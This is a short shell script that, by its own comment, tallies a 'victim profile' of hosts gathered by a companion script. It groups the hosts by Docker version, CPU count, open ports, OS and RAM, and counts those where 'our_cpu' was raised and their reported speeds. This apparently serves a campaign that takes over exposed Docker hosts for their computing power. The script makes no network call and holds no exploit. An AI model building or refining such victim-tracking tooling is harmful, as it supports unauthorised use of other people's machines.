#!/bin/sh
# Tally the victim profile written by _prof.sh
F=/tmp/_prof.lines
echo "hosts_profiled=$(wc -l < "$F" 2>/dev/null || echo 0)"
echo "== docker versions =="
grep -o 'docker=[0-9.]*' "$F" | sort | uniq -c | sort -rn | head -8
echo "== vCPUs =="
grep -o 'ncpu=[0-9]*' "$F" | sort | uniq -c | sort -rn | head -8
echo "== ports =="
grep -o 'port=[0-9]*' "$F" | sort | uniq -c | sort -rn
echo "== os/arch =="
grep -o 'os=[a-z]*/[a-z0-9]*' "$F" | sort | uniq -c | sort -rn | head -6
echo "== RAM buckets =="
grep -o 'mem_mb=[0-9]*' "$F" | cut -d= -f2 | awk '{ if ($1 < 1024) a++; else if ($1 < 4096) b++; else c++ } END { print "lt1G=" a+0, "1to4G=" b+0, "gt4G=" c+0 }'
echo "== upgraded_to_2048 =="
grep -c 'our_cpu=2048' "$F"
echo "== has_thread_hint =="
grep -c 'hint=1' "$F"
echo "== top_reported_speeds =="
grep -o 'speed=[0-9.]*' "$F" | cut -d= -f2 | sort -rn | head -10 | tr '\n' ' '
echo
echo "== sample lines =="
head -6 "$F"
